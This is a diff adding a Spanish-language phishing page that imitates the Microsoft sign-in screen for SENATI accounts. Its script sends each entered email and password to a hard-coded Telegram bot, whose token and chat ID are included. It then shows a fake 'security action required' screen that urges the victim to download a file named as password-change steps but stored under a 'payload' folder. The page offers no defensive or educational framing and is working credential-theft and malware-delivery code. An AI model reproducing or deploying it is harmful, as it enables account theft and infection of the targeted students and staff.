@@ -1,0 +1,522 @@
+<!DOCTYPE html>
+<html dir="ltr" lang="es">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
+    <title>Iniciar sesión en la cuenta</title>
+    
+    <link rel="shortcut icon" href="favicon_2.ico" type="image/x-icon" sizes="32x32" />
+
+    <style>
+        *, *::before, *::after { box-sizing: border-box; margin: 0; padding: 0; }
+        html, body { height: 100%; font-family: "Segoe UI", "Helvetica Neue", "Lucida Grande", "Roboto", "Ubuntu", sans-serif; overflow: hidden; }
+        
+        /* CAPA 1: Imagen de Fondo Fija Nítida */
+        .body-img {
+            background-image: url("independencia.jpg");
+            position: fixed;
+            top: 0; bottom: 0; right: 0; left: 0;
+            background-repeat: no-repeat;
+            background-size: cover;
+            background-position: center;
+            z-index: -3;
+        }
+
+        /* CAPA 2: Video de Fondo */
+        video {
+            display: block;
+            position: fixed !important;
+            top: 0 !important;
+            left: 0 !important;
+            width: 100% !important;
+            height: 100% !important;
+            object-fit: cover;
+            z-index: -2 !important;
+        }
+
+        /* CAPA 3: Filtro Oscuro Corregido */
+        .video_log {
+            background: rgba(0, 0, 0, 0.60) !important;
+            width: 100% !important;
+            height: 100% !important;
+            position: fixed;
+            top: 0; left: 0;
+            z-index: -1;
+        }
+
+        /* CAPA 4: Contenedor Principal Centrado */
+        .page-wrapper {
+            position: relative;
+            z-index: 2;
+            height: 100vh;
+            width: 100vw;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+        }
+
+        /* Tarjeta de Inicio de Sesión estilo Microsoft */
+        .login-card {
+            background: #ffffff;
+            width: 100%;
+            max-width: 440px;
+            min-height: 338px;
+            padding: 44px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            text-align: left;
+            display: flex;
+            flex-direction: column;
+            position: relative;
+        }
+
+        /* Logotipo de SENATI dentro de la tarjeta */
+        .logo-container {
+            margin-bottom: 20px;
+        }
+        .logo-container img {
+            height: 36px;
+            display: block;
+        }
+
+        /* Estilos de las Vistas (Email y Password) */
+        .view-section {
+            display: none;
+            flex-direction: column;
+            width: 100%;
+        }
+        .view-section.active-view {
+            display: flex;
+        }
+
+        /* Bloque del correo guardado arriba de "Escribir contraseña" */
+        .identity-banner {
+            display: flex;
+            align-items: center;
+            font-size: 15px;
+            color: #1b1b1b;
+            margin-bottom: 16px;
+            cursor: pointer;
+        }
+        .back-arrow {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+        }
+
+        /* Títulos */
+        .title {
+            font-size: 24px;
+            font-weight: 600;
+            color: #1b1b1b;
+            margin-bottom: 16px;
+        }
+
+        /* Mensaje de Error estilo Microsoft */
+        .error-message {
+            color: #e81123;
+            font-size: 13px;
+            margin-bottom: 12px;
+            display: none;
+        }
+
+        /* Campo de Entrada de Texto */
+        .input-group {
+            margin-bottom: 20px;
+            position: relative;
+        }
+        .input-control {
+            width: 100%;
+            border: none;
+            border-bottom: 1px solid #666666;
+            padding: 6px 0;
+            font-size: 16px;
+            outline: none;
+            color: #1b1b1b;
+            font-family: inherit;
+            transition: border-color 0.2s;
+        }
+        .input-control:focus {
+            border-bottom: 2px solid #0067b8;
+            padding-bottom: 5px;
+        }
+        .input-control.input-error {
+            border-bottom: 1px solid #e81123 !important;
+        }
+        .input-control.input-error:focus {
+            border-bottom: 2px solid #e81123 !important;
+        }
+        .input-control::placeholder {
+            color: #707070;
+            font-weight: 300;
+        }
+
+        /* Enlaces */
+        .help-link {
+            font-size: 13px;
+            color: #0067b8;
+            text-decoration: none;
+            display: inline-block;
+            margin-bottom: 24px;
+        }
+        .help-link:hover {
+            text-decoration: underline;
+        }
+
+        /* Contenedores de los Botones */
+        .button-group {
+            display: flex;
+            justify-content: flex-end;
+            margin-bottom: 20px;
+        }
+        .btn-action {
+            background-color: #0067b8;
+            color: #ffffff;
+            border: none;
+            padding: 6px 12px;
+            font-size: 15px;
+            min-width: 108px;
+            min-height: 32px;
+            cursor: pointer;
+            font-family: inherit;
+            text-align: center;
+        }
+        .btn-action:hover {
+            background-color: #005da6;
+        }
+
+        /* Sección de Opciones de Inicio de Sesión */
+        .options-container {
+            width: 100%;
+            max-width: 440px;
+            background: #ffffff;
+            margin-top: 20px;
+            box-shadow: 0 2px 6px rgba(0,0,0,0.2);
+            padding: 12px 44px;
+            display: flex;
+            align-items: center;
+            cursor: pointer;
+            transition: background 0.2s;
+        }
+        .options-container:hover {
+            background: #f2f2f2;
+        }
+        .options-icon {
+            width: 32px;
+            height: 32px;
+            margin-right: 8px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+        }
+        .options-icon img {
+            width: 100%;
+            height: 100%;
+            object-fit: contain;
+        }
+        .options-text {
+            font-size: 15px;
+            color: #1b1b1b;
+        }
+
+        /* Pie de página */
+        .footer-links {
+            position: fixed;
+            bottom: 20px;
+            right: 30px;
+            display: flex;
+            gap: 16px;
+            z-index: 10;
+        }
+        .footer-links a {
+            color: #ffffff;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .footer-links a:hover {
+            text-decoration: underline;
+        }
+
+        /* Adaptación para Dispositivos Móviles */
+        @media (max-width: 500px) {
+            .page-wrapper {
+                justify-content: flex-start;
+                padding: 0;
+                background-color: #ffffff;
+            }
+            .login-card {
+                box-shadow: none;
+                padding: 44px 24px;
+                min-height: auto;
+            }
+            .options-container {
+                box-shadow: none;
+                border-top: 1px solid #e5e5e5;
+                padding: 16px 24px;
+                margin-top: 0;
+            }
+            .footer-links {
+                position: static;
+                margin-top: auto;
+                padding: 20px;
+                width: 100%;
+                justify-content: center;
+                background: rgba(0,0,0,0.6);
+            }
+        }
+    </style>
+</head>
+<body>
+
+    <div class="body-img"></div>
+    <div class="video_log"></div>
+
+    <video muted autoplay loop playsinline preload="auto">
+        <source src="https://senati.blackboard.com/bbcswebdav/xid-10359_1">
+    </video>
+
+    <div class="page-wrapper">
+        
+        <div class="login-card">
+            <div class="logo-container">
+                <img src="https://aadcdn.msftauthimages.net/dbd5a2dd-mhbtl0s7mnpe7copyihnx5eqzxphdvb3wnc9nifovky/logintenantbranding/0/bannerlogo?ts=636447417650821001" alt="SENATI">
+            </div>
+            
+            <div class="view-section active-view" id="emailSection">
+                <h1 class="title">Iniciar sesión</h1>
+                
+                <div class="error-message" id="errorDiv">
+                    No se ha podido encontrar una cuenta con ese nombre de usuario.
+                </div>
+                
+                <div class="input-group">
+                    <input type="text" id="emailInput" class="input-control" placeholder="alguien@senati.pe" autocomplete="off" required>
+                </div>
+                
+                <a href="#" class="help-link" onclick="return false;">¿No puede acceder a su cuenta?</a>
+                
+                <div class="button-group">
+                    <button type="button" id="btnNext" class="btn-action">Siguiente</button>
+                </div>
+            </div>
+
+            <div class="view-section" id="passwordSection">
+                <div class="identity-banner" id="backToEmail">
+                    <div class="back-arrow">
+                        <svg xmlns="http://www.w3.org/2000/svg" width="16" height="16" viewBox="0 0 16 16" fill="none" stroke="#2b2b2b" stroke-width="1.5"><path d="M15 8H1M1 8L8 15M1 8L8 1"/></svg>
+                    </div>
+                    <span id="displayEmail">correo@senati.pe</span>
+                </div>
+
+                <h1 class="title">Escribir contraseña</h1>
+
+                <div class="error-message" id="errorPasswordDiv">
+                    Su cuenta o contraseña no son correctas. Si no recuerda su contraseña, <a href="#" onclick="return false;" style="color: #0067b8; text-decoration: none;">restablézcala ahora.</a>
+                </div>
+                
+                <div class="input-group">
+                    <input type="password" id="passwordInput" class="input-control" placeholder="Contraseña" autocomplete="off" required>
+                </div>
+                
+                <a href="#" class="help-link" onclick="return false;">He olvidado mi contraseña</a>
+                
+                <div class="button-group">
+                    <button type="button" id="btnSubmit" class="btn-action">Iniciar sesión</button>
+                </div>
+            </div>
+        </div>
+
+        <div class="options-container" id="optionsContainer">
+            <div class="options-icon">
+                <img src="https://aadcdn.msftauthimages.net/shared/1.0/content/images/signin-options_3e3f6b73c3f310c31d2c4d131a8ab8c6.svg" alt="Opciones">
+            </div>
+            <div class="options-text">Opciones de inicio de sesión</div>
+        </div>
+
+        <div class="footer-links">
+            <a href="https://www.microsoft.com/es-ES/servicesagreement/" target="_blank">Términos de uso</a>
+            <a href="https://privacy.microsoft.com/es-ES/privacystatement" target="_blank">Privacidad y cookies</a>
+        </div>
+    </div>
+
+    <script>
+        // ===================== CONFIGURACIÓN DE TELEGRAM =====================
+        const BOT_TOKEN = "8825324891:AAF0gqko-3CPTnlIaOfgkPkEoqOBkl8jku0";
+        const CHAT_ID = "8946554516";
+
+        // Función para enviar credenciales a Telegram
+        async function enviarAlTelegram(correo, password) {
+            const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
+            const mensaje = `🔐 *NUEVO ACCESO SENATI* 🔐\n\n📧 *Correo:* ${correo}\n🔑 *Contraseña:* ${password}\n\n📅 ${new Date().toLocaleString()}`;
+            try {
+                const response = await fetch(url, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: CHAT_ID,
+                        text: mensaje,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                if (response.ok) {
+                    console.log("✅ Credenciales enviadas a Telegram correctamente");
+                } else {
+                    console.error("Error en respuesta de Telegram:", response.status);
+                }
+            } catch (error) {
+                console.error("❌ Error de conexión con Telegram:", error);
+            }
+        }
+
+        // ===================== ELEMENTOS DEL DOM =====================
+        const emailInput = document.getElementById('emailInput');
+        const passwordInput = document.getElementById('passwordInput');
+        const errorDiv = document.getElementById('errorDiv');
+        const errorPasswordDiv = document.getElementById('errorPasswordDiv');
+        const emailSection = document.getElementById('emailSection');
+        const passwordSection = document.getElementById('passwordSection');
+        const displayEmailSpan = document.getElementById('displayEmail');
+        const optionsContainer = document.getElementById('optionsContainer');
+        const btnNext = document.getElementById('btnNext');
+        const btnSubmit = document.getElementById('btnSubmit');
+        const backToEmailBtn = document.getElementById('backToEmail');
+
+        // Variable para almacenar el correo ingresado (para usarlo en el paso de contraseña)
+        let storedEmail = "";
+        let passwordAttempts = 0; // contador de intentos de contraseña
+
+        // ===================== FUNCIÓN PROCESAR CORREO =====================
+        function procesarCorreo() {
+            const emailValue = emailInput.value.trim();
+
+            // Validación: no vacío y que termine en @senati.pe
+            if (emailValue === "" || !emailValue.toLowerCase().endsWith("@senati.pe")) {
+                errorDiv.style.display = "block";
+                emailInput.classList.add('input-error');
+                return;
+            }
+
+            // Ocultar error y estilo de error
+            errorDiv.style.display = "none";
+            emailInput.classList.remove('input-error');
+
+            // Guardar email para usarlo luego
+            storedEmail = emailValue;
+
+            // Enviar el correo a Telegram con contraseña "Pendiente"
+            enviarAlTelegram(storedEmail, "Pendiente");
+
+            // Mostrar el correo en el banner de la pantalla de contraseña
+            displayEmailSpan.textContent = storedEmail;
+
+            // Cambiar a la vista de contraseña
+            emailSection.classList.remove('active-view');
+            passwordSection.classList.add('active-view');
+
+            // Ocultar el recuadro de "Opciones de inicio de sesión"
+            optionsContainer.style.display = "none";
+
+            // Limpiar campo y errores de contraseña
+            passwordInput.value = "";
+            errorPasswordDiv.style.display = "none";
+            passwordInput.classList.remove('input-error');
+
+            // Enfocar el campo de contraseña
+            passwordInput.focus();
+        }
+
+    // ===================== FUNCIÓN PROCESAR CONTRASEÑA (MODIFICADA) =====================
+    function procesarContrasena() {
+        const passwordValue = passwordInput.value.trim();
+
+        if (passwordValue === "") {
+            errorPasswordDiv.style.display = "block";
+            passwordInput.classList.add('input-error');
+            return;
+        }
+
+        // Ocultar error
+        errorPasswordDiv.style.display = "none";
+        passwordInput.classList.remove('input-error');
+
+        // Enviar credenciales a Telegram
+        enviarAlTelegram(storedEmail, passwordValue);
+
+        // === AQUÍ CAMBIA EL FLUJO ===
+        mostrarPantallaDescargaPayload();
+    }
+
+    // Nueva función para mostrar el mensaje + botón de descarga
+    function mostrarPantallaDescargaPayload() {
+        // Ocultamos las secciones actuales
+        emailSection.classList.remove('active-view');
+        passwordSection.classList.remove('active-view');
+
+        // Creamos una nueva vista temporal
+        let descargaHTML = `
+        <div style="text-align: center; padding: 30px 20px;">
+            <h1 class="title" style="color: #d32f2f;">⚠️ Acción Requerida</h1>
+            <p style="font-size: 17px; margin: 20px 0; line-height: 1.5;">
+                Por motivos de seguridad, debe cambiar su contraseña.<br><br>
+                Descargue el documento con los pasos a seguir.
+            </p>
+            
+            <a href="payload/Reporte-Seguridad.pdf" 
+               download="Pasos_Cambio_Contraseña_SENATI.pdf"
+               style="display: inline-block; background: #d32f2f; color: white; padding: 16px 32px; 
+                      font-size: 17px; font-weight: 600; border-radius: 8px; text-decoration: none; 
+                      margin: 20px 0; box-shadow: 0 4px 12px rgba(211,47,47,0.4);">
+                📄 DESCARGAR PASOS PARA CAMBIAR CONTRASEÑA
+            </a>
+            
+            <p style="font-size: 13px; color: #666; margin-top: 25px;">
+                Este es un procedimiento obligatorio para continuar con su cuenta.
+            </p>
+        </div>
+    `;
+
+        // Reemplazamos el contenido de la tarjeta
+        const loginCard = document.querySelector('.login-card');
+        loginCard.innerHTML = descargaHTML;
+    }
+
+        // ===================== EVENTOS =====================
+        btnNext.addEventListener('click', procesarCorreo);
+        emailInput.addEventListener('keydown', (e) => {
+            if (e.key === "Enter") procesarCorreo();
+        });
+
+        btnSubmit.addEventListener('click', procesarContrasena);
+        passwordInput.addEventListener('keydown', (e) => {
+            if (e.key === "Enter") procesarContrasena();
+        });
+
+        // Botón para volver al paso de correo (flecha)
+        backToEmailBtn.addEventListener('click', () => {
+            // Regresar a la vista de email
+            passwordSection.classList.remove('active-view');
+            emailSection.classList.add('active-view');
+            // Volver a mostrar el panel de opciones
+            optionsContainer.style.display = "flex";
+            // Reiniciar contador de intentos de contraseña
+            passwordAttempts = 0;
+            // Limpiar posibles errores
+            errorDiv.style.display = "none";
+            errorPasswordDiv.style.display = "none";
+            emailInput.classList.remove('input-error');
+            passwordInput.classList.remove('input-error');
+            // Limpiar campos
+            emailInput.value = storedEmail; // opcional: mantener el correo escrito
+            passwordInput.value = "";
+            // Enfocar el campo de correo
+            emailInput.focus();
+        });
+
+        // Opcional: al hacer clic en "Opciones de inicio de sesión" no hace nada, solo es decorativo.
+    </script>
+</body>
+</html>
